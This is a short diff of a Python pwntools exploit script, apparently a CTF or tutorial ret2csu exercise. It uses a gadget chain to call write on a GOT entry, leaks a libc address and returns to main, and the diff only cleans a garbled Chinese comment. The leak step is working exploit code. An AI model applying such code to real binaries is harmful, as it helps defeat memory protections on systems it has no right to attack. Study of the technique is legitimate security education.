@@ -29,7 +29,7 @@ def csu(r12,r13,r14,r15,ret_addr):
 sh.recvuntil("Hello, World\n")
 csu(write_got,1,write_got,8,main_addr)
 #利用write函数（因为gadget2中的代码为call，所以必须为write函数的got地址）
-#来读取write的got表内容，向后读取8个字节，然后返回至main住花鸟属
+#来读取write的got表内容，向后读取8个字节，然后返回至main
 write_addr = u64(sh.recv(8))
 #接收数据，并解包
 print (hex(write_addr))
